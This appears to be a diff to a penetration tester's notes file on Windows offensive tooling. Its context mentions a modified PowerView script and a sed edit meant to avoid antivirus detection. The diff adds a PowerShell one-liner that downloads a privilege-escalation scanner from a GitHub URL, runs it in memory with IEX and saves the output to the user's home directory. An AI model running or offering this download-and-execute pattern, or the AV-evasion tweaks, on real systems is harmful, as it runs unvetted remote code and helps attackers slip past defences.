@@ -55,3 +55,6 @@ sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions\$Win32Functions
 
 Powerview mod to avoid AV:
 powervw.ps1
+
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pand0rausa/WinEscalation-/master/WindowsScanner.ps1'); scan-windows | Out-File $home\out.txt
